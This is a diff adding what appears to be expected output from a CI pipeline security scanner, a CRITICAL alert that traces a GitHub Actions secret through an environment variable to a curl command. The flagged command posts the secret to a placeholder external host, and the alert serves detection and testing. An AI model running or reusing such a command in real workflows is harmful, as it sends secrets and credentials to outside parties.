@@ -1,0 +1,14 @@
+
+[ALERT] Potential Secret Exfiltration Detected!
+============================================================
+Context              : step_1
+Source               : ${{ secrets.TEST_SECRET }}
+Source Category      : S_ctx
+Sink                 : curl
+Sink Category        : K_cli
+Destination Type     : untrusted_external
+Risk Score           : 10.0 / 10
+Risk Level           : CRITICAL
+Command              : curl --data "$SECRET" https://example.invalid/collect
+Path                 : ${{ secrets.TEST_SECRET }} -> job.env.SECRET -> curl
+------------------------------------------------------------
